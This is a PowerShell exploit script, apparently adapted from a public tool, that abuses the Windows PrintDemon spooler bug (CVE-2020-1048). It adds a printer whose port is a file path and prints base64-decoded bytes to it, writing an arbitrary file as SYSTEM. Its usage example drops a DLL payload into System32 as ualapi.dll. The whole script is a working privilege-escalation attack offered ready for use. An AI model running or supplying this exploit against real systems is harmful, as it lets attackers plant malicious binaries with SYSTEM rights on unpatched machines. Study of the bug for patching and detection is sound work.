<#

.SYNOPSIS

    This script uses the PrintDemon bug to print a file (base64 encoded) anywhere as SYSTEM.

.DESCRIPTION

    This script creates a printer with a given printer port and uses the PrintDemon bug to drop
    a file from base64 encoded string code you given anywhere on disk as SYSTEM. Simply given the
    printer port as a file path where you want to print to and gievn the base64 encoded string code 
    from which you want to decode from.

.LINK

    https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1048
    https://windows-internals.com/printdemon-cve-2020-1048/
    https://github.com/BC-SECURITY/Invoke-PrintDemon

.INPUTS

    [string]$PrinterName,
    [string]$PortName,
    [string]$Base64Code

.OUTPUTS

    Output will be shown in the console

.NOTES

    Version:        0.1
    Author:         WHOAMI
    Blog:           https://whoamianony.top/
    Date:           05/30/2020

.EXAMPLE

    Import-Module .\Invoke-PrintDemon.ps1
    Invoke-PrintDemon -PrinterName "PrintDemon" -Portname "C:\Windows\System32\ualapi.dll" -Base64code
    "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAA4fug4AtAnNI
    bgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSG1vZGUuDQ0K...JAAAAAAAAABHbe94AwyBKwMMgSsDDIErWGSFKgIMgStYZIA
    qAQyBKxdngCoEDIErAwyAK0EMgSsXZ4IqAQyBKxdnhSoHDIErxWOJKgIMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

#>

# Set Error Action to Silently Continue
$ErrorActionPreference = "SilentlyContinue"

#---------------------------------------[Format Status Function]------------------------------------

function FormatStatus([string]$Flag, [string]$Message) {
    If($Flag -eq "1") {
        Write-Host "[+] " -ForegroundColor:Green -NoNewline
        Write-Host $Message
    }ElseIf($Flag -eq "0") {
        Write-Host "[-] " -ForegroundColor:Red -NoNewline
        Write-Host $Message
    }
}

function EscapePath([string]$Path) {
    $Path = $Path -split '\\' -join '\\'
    return $Path
}

#---------------------------------------[CreatePrinter Function]------------------------------------

Function CreatePrinter([string]$PrinterName, [string]$PortName) {

  Begin {
  }

  Process {
    Try {
      Add-PrinterDriver -Name "Generic / Text Only"
      Add-Printerport -name $PortName
      Add-Printer -Name $PrinterName -DriverName "Generic / Text Only" -PortName $PortName
    }
    Catch {
      Write-Host $_.Exception
      Exit
    }
  }

  End {
    If ($?) {
      FormatStatus 1 "Start creating a printer completed successfully."
    }
  }
}

#--------------------------------------[StartPrintDemon Function]------------------------------------

Function StartPrintDemon([string]$Base64Code) {

    Begin {
        FormatStatus 1 "Start exploiting the PrintDemon bug."
    }

    Process {
        $assemblies = (
            "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        );
    
        $MethodDefinition = @"
            using System;
            using System.IO;
            using System.Runtime.InteropServices;

            namespace Printer {

                public class RawPrinterHelper
                {
                    // Structure and API declarions:
                    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
                    public class DOCINFOA
                    {
                        [MarshalAs(UnmanagedType.LPStr)]
                        public string pDocName;
                        [MarshalAs(UnmanagedType.LPStr)]
                        public string pOutputFile;
                        [MarshalAs(UnmanagedType.LPStr)]
                        public string pDataType;
                    }
                    [DllImport("winspool.Drv", EntryPoint = "OpenPrinterA", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
                    public static extern bool OpenPrinter([MarshalAs(UnmanagedType.LPStr)] string szPrinter, out IntPtr hPrinter, IntPtr pd);

                    [DllImport("winspool.Drv", EntryPoint = "ClosePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
                    public static extern bool ClosePrinter(IntPtr hPrinter);

                    [DllImport("winspool.Drv", EntryPoint = "StartDocPrinterA", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
                    public static extern bool StartDocPrinter(IntPtr hPrinter, Int32 level, [In, MarshalAs(UnmanagedType.LPStruct)] DOCINFOA di);

                    [DllImport("winspool.Drv", EntryPoint = "EndDocPrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
                    public static extern bool EndDocPrinter(IntPtr hPrinter);

                    [DllImport("winspool.Drv", EntryPoint = "StartPagePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
                    public static extern bool StartPagePrinter(IntPtr hPrinter);

                    [DllImport("winspool.Drv", EntryPoint = "EndPagePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
                    public static extern bool EndPagePrinter(IntPtr hPrinter);

                    [DllImport("winspool.Drv", EntryPoint = "WritePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
                    public static extern bool WritePrinter(IntPtr hPrinter, IntPtr pBytes, Int32 dwCount, out Int32 dwWritten);

                    public static bool SendBytesToPrinter(string szPrinterName, IntPtr pBytes, Int32 dwCount)
                    {
                        Int32 dwError = 0, dwWritten = 0;
                        IntPtr hPrinter = new IntPtr(0);
                        DOCINFOA di = new DOCINFOA();
                        bool bSuccess = false; // Assume failure unless you specifically succeed.

                        di.pDocName = "My C#.NET RAW Document";
                        di.pDataType = "RAW";

                        // Open the printer.
                        if (OpenPrinter(szPrinterName.Normalize(), out hPrinter, IntPtr.Zero))
                        {
                            // Start a document.
                            if (StartDocPrinter(hPrinter, 1, di))
                            {
                                // Start a page.
                                if (StartPagePrinter(hPrinter))
                                {
                                    // Write your bytes.
                                    bSuccess = WritePrinter(hPrinter, pBytes, dwCount, out dwWritten);
                                    EndPagePrinter(hPrinter);
                                }
                                EndDocPrinter(hPrinter);
                            }
                            ClosePrinter(hPrinter);
                        }
                        // If you did not succeed, GetLastError may give more information
                        // about why not.
                        if (bSuccess == false)
                        {
                        dwError = Marshal.GetLastWin32Error();
                        }
                        return bSuccess;
                    }

                    public static bool SendFileToPrinter(string szPrinterName, string szFileName)
                    {
                        // Open the file.
                        FileStream fs = new FileStream(szFileName, FileMode.Open);
                        // Create a BinaryReader on the file.
                        BinaryReader br = new BinaryReader(fs);
                        // Dim an array of bytes big enough to hold the file's contents.
                        Byte[] bytes = new Byte[fs.Length];
                        bool bSuccess = false;
                        // Your unmanaged pointer.
                        IntPtr pUnmanagedBytes = new IntPtr(0);
                        int nLength;

                        nLength = Convert.ToInt32(fs.Length);
                        // Read the contents of the file into the array.
                        bytes = br.ReadBytes(nLength);
                        // Allocate some unmanaged memory for those bytes.
                        pUnmanagedBytes = Marshal.AllocCoTaskMem(nLength);
                        // Copy the managed byte array into the unmanaged array.
                        Marshal.Copy(bytes, 0, pUnmanagedBytes, nLength);
                        // Send the unmanaged bytes to the printer.
                        bSuccess = SendBytesToPrinter(szPrinterName, pUnmanagedBytes, nLength);
                        // Free the unmanaged memory that you allocated earlier.
                        Marshal.FreeCoTaskMem(pUnmanagedBytes);
                        return bSuccess;
                    }
                }
            }
"@;

            Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $MethodDefinition -Language CSharp;
            $PE =  [System.Convert]::FromBase64String($Base64Code)
            [IntPtr] $unmanaged = ([system.runtime.interopservices.marshal]::AllocHGlobal($pe.Length));
            [system.runtime.interopservices.marshal]::Copy($PE, 0, $unmanaged, $PE.Length);
            $result = [Printer.RawPrinterHelper]::SendBytesToPrinter("PrintDemon", $unmanaged, $PE.Length);
    }

    End {
        If ($?) {
            FormatStatus 1 "Successfully exploited the PrintDemon bug."
        }
    }
}

#--------------------------------------------[Main Function]-------------------------------------------

Function Invoke-PrintDemon {
    param(
        [Parameter()]
        [string]$PrinterName,
        [string]$PortName,
        [string]$Base64Code
    )

    $Banner = @"

    ____       _       __  ____                           
   / __ \_____(_)___  / /_/ __ \___  ____ ___  ____  ____ 
  / /_/ / ___/ / __ \/ __/ / / / _ \/ __ `__  \/ __ \/ __ \
 / ____/ /  / / / / / /_/ /_/ /  __/ / / / / / /_/ / / / /
/_/   /_/  /_/_/ /_/\__/_____/\___/_/ /_/ /_/\____/_/ /_/ 

==========================================================
        Author:         WHOAMI (whoamianony.top)
==========================================================

"@
    Write-Host $Banner

    $Printer = Get-Printer|Select-String "$PrinterName"
    If($Printer) {
        FormatStatus 0 "The specified printer already exists"
    }

    $EscapePortName = EscapePath $PortName
    $Port = Get-PrinterPort|Select-String "$EscapePortName"
    If($Port) {
        FormatStatus 0 "The specified port already exists"
    }

    CreatePrinter $PrinterName $PortName
    StartPrintDemon $Base64Code
}